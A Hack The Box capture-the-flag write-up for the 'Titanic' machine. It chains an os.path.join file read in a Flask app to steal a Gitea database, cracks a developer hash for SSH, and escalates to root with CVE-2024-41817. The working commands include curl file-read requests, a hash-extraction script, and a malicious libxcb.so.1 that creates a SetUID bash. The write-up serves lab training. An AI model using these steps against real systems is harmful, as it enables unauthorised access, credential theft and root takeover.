---
title: Titanic
summary: Hack The Box Linux machine chaining an os.path.join directory traversal in a Flask app to read the Gitea database, cracking a developer hash for SSH, then abusing a root cron that runs a vulnerable ImageMagick (CVE-2024-41817) for root.
date: 2026-10-18
tags: [Hack The Box, Web, Flask, Directory Traversal, Gitea, ImageMagick, PrivEsc]
difficulty: easy
os: Linux
url: https://app.hackthebox.com/machines/Titanic
---

# CTF Room: Titanic
- [Link to machine](https://app.hackthebox.com/machines/Titanic)
- **Difficulty:** Easy
- **Category:** Web / PrivEsc
- **OS:** Linux

## 1. Brief
Titanic is a cruise-booking site built on Flask. The booking endpoint lets me download my own ticket file, and the way it builds the file path means I can read any file on the box. I use that to pull the Gitea database, crack a developer password, SSH in, and then abuse a root-run cron job that calls a vulnerable version of ImageMagick to land a root shell.

---

## 2. Recon

### NMAP Scan
```bash
nmap -p- --min-rate 10000 10.10.11.55
```
```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two ports. Running the scripts and version detection on them:

```bash
nmap -p 22,80 -sCV 10.10.11.55
```
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux
```

SSH on 22, Apache on 80. The OpenSSH and Apache versions both line up with Ubuntu 22.04 (jammy). Port 80 redirects to `titanic.htb`, so there's virtual hosting going on. I added it to my hosts file:

```bash
echo "10.10.11.55 titanic.htb" | sudo tee -a /etc/hosts
```

### Subdomain Fuzzing
Since the box cares about the `Host` header, I fuzzed for subdomains with `ffuf`, filtering automatically on the baseline response:

```bash
ffuf -u http://10.10.11.55 -H "Host: FUZZ.titanic.htb" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```
```text
dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276]
```

`dev.titanic.htb` answers differently, so I added it to hosts as well:

```bash
10.10.11.55 titanic.htb dev.titanic.htb
```

---

## 3. Enumeration

### titanic.htb
The main site is a cruise company. None of the nav links go anywhere, but the **Book** buttons pop an overlay booking form. Submitting it downloads a JSON file named `[GUID].json`:

```bash
cat 575d8716-99ea-48d8-b209-e3a8bec90696.json | jq .
```
```json
{
  "name": "0xdf",
  "email": "0xdf@titanic.htb",
  "phone": "1111111111",
  "date": "2026-01-01",
  "cabin": "Standard"
}
```

The response headers give away the stack:

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Type: text/html; charset=utf-8
```

Werkzeug means this is almost certainly Flask, and the default 404 page confirms it. A `feroxbuster` run didn't turn up much beyond `/download` (returns 400 with no params) and `/book` (405 because it only takes POST). So the interesting behaviour is the booking download, which I'll come back to.

### dev.titanic.htb
The dev subdomain is running a **Gitea** instance. Hitting **Explore** shows two public repos.

**docker-config** has two folders, each with a `docker-compose.yml`. The Gitea one tells me exactly where Gitea's data lives on the host:

```yaml
services:
  gitea:
    image: gitea/gitea
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
```

And the MySQL one leaks credentials:

```yaml
services:
  mysql:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: '||MySQLP@$$w0rd!||'
      MYSQL_DATABASE: tickets
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: ||sql_password||
```

**flask-app** holds the source for `titanic.htb`. The `app.py` is where it all comes together. `/book` saves my form data to a random UUID filename and redirects me to `/download`:

```python
@app.route('/book', methods=['POST'])
def book_ticket():
    data = { ... }
    ticket_id = str(uuid4())
    json_filename = f"{ticket_id}.json"
    json_filepath = os.path.join(TICKETS_DIR, json_filename)
    with open(json_filepath, 'w') as json_file:
        json.dump(data, json_file)
    return redirect(url_for('download_ticket', ticket=json_filename))
```

And `/download` takes my `ticket` parameter straight into `os.path.join` with a constant `TICKETS_DIR`, then sends the file if it exists:

```python
@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400
    json_filepath = os.path.join(TICKETS_DIR, ticket)
    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404
```

That's a file-read bug waiting to happen.

---

## 4. Foothold - Directory Traversal as developer

### The os.path.join trick
My first instinct was classic `../../../../etc/passwd`, but seeing `os.path.join` in the source means I don't even need the traversal. Python's `os.path.join` has a quirk: if any argument starts with `/`, everything before it gets thrown away.

```python
>>> os.path.join("tickets", "ticket.json")
'tickets/ticket.json'
>>> os.path.join("tickets", "/etc/passwd")
'/etc/passwd'
```

So passing an absolute path as `ticket` escapes `TICKETS_DIR` entirely. There are three behaviours I can use to probe the filesystem:

```bash
# missing file -> JSON error
curl 'http://titanic.htb/download?ticket=/etc/0xdf'
{"error":"Ticket not found"}

# a real file -> contents
curl 'http://titanic.htb/download?ticket=/etc/hostname'
titanic

# a directory -> exists() true, send_file crashes with 500
curl 'http://titanic.htb/download?ticket=/etc/'
<title>500 Internal Server Error</title>
```

The 500-on-directory behaviour even lets me confirm directories exist, which is handy for finding paths.

### User flag
`/etc/passwd` showed only one non-root user with a shell: `developer`. So I just read the flag straight out of their home directory:

```bash
curl 'http://titanic.htb/download?ticket=/home/developer/user.txt'
```
```text
||<user flag>||
```

This is why the user flag on Titanic fell in about three minutes. But I want a real shell, so onward.

### Loot the Gitea database
The docker-compose told me Gitea's `/data` volume maps to `/home/developer/gitea/data`. Per the Gitea docs, the config ends up at `/data/gitea/conf/app.ini`. Reading it:

```bash
curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini'
```
```text
[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
```

SQLite, and the path inside the container is `/data/gitea/gitea.db`, which on the host is `/home/developer/gitea/data/gitea/gitea.db`. I pulled the whole database down with `curl` (getting it cleanly out of Burp is a pain):

```bash
curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db
file gitea.db
# gitea.db: SQLite 3.x database ...
```

### Extract and crack the hashes
Gitea stores account hashes in the `user` table as `pbkdf2$50000$50`. I converted them into the format `hashcat` wants (mode 10900, PBKDF2-HMAC-SHA256) by base64-ing the raw hash and salt:

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do
  digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64)
  salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64)
  name=$(echo "$data" | cut -d'|' -f3)
  echo "${name}:sha256:50000:${salt}:${digest}"
done | tee gitea.hashes
```
```text
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

Then straight into `hashcat` with `rockyou`:

```bash
hashcat gitea.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
```

The `developer` hash cracks to ||25282528||.

### SSH
`developer` is a real system user too, so the cracked Gitea password gets me in over SSH:

```bash
sshpass -p '||25282528||' ssh developer@titanic.htb
```
```text
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)
developer@titanic:~$
```

Shell as developer. `user.txt` is sitting right there if I hadn't already grabbed it through the web bug.

---

## 5. Privilege Escalation - CVE-2024-41817 (ImageMagick)

### Finding the cron
Developer's home is empty of anything useful. `/proc` is mounted with `hidepid=invisible`, so I can only see my own and root's processes. Poking around `/opt`:

```bash
ls /opt/
# app  containerd  scripts
```

`/opt/scripts` has one script:

```bash
cat /opt/scripts/identify_images.sh
```
```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

`metadata.log` is owned by root and updates every minute, which tells me this script runs on a root cron. Two things matter here: it `cd`s into the images directory before running `magick`, and **developer can write into that images directory**.

### The vulnerability
The box runs ImageMagick 7.1.1-35:

```bash
magick -version
# Version: ImageMagick 7.1.1-35 Q16-HDRI
```

That version is hit by [CVE-2024-41817](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8): because of how it was compiled, ImageMagick includes the current working directory in its search path for config files and shared libraries. The reliable PoC drops a malicious `libxcb.so.1` (a library ImageMagick loads) into the working directory - and since the cron `cd`s into a directory I control, my library gets loaded and run as root.

### PoC as developer
First I confirmed code execution runs as me by building a library whose constructor calls `id`:

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF

magick /dev/null /dev/null
# uid=1000(developer) gid=1000(developer) groups=1000(developer)
```

Running `magick` loaded my library and ran the constructor. 

### Root shell
Now I swap the payload to make a SetUID/SetGID copy of `bash`, drop it in the images directory, and wait for the root cron to run `magick` for me:

```bash
cd /opt/app/static/assets/images
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf");
    exit(0);
}
EOF
```

After the next minute ticks over, my SetUID bash is there:

```bash
ls -l /tmp/0xdf
# -rwsrwsrwx 1 root root 1396520 ... /tmp/0xdf
```

Running it with `-p` (so it keeps the effective UID) drops a root shell:

```bash
/tmp/0xdf -p
# id
# uid=1000(developer) ... euid=0(root) ...
cat /root/root.txt
```
```text
||<root flag>||
```

Rooted. 

---

## 6. Flags / Proof

| Flag | Value |
|:--|:--|
| User flag | `||<user flag>||` |
| Root flag | `||<root flag>||` |

---

## 7. Summary
Titanic is a clean chain with two good lessons:

- **`os.path.join` is not a sandbox.** Passing user input as a later argument lets an absolute path blow away the base directory entirely - no `../` needed. Always validate or `os.path.abspath`-check the resolved path against the intended root.
- **Working directory + library search path = privesc.** CVE-2024-41817 makes ImageMagick load `libxcb.so.1` from the CWD. Because a root cron `cd`s into a developer-writable directory, dropping a malicious library there runs code as root.

The arbitrary file read tied everything together - reading source, config, and the Gitea SQLite DB - and from there it was crack-the-hash into SSH, then a textbook library-injection cron escalation.

**Tools used:** `nmap`, `ffuf`, `feroxbuster`, `curl`, `sqlite3`, `hashcat`, `gcc`, `sshpass`.
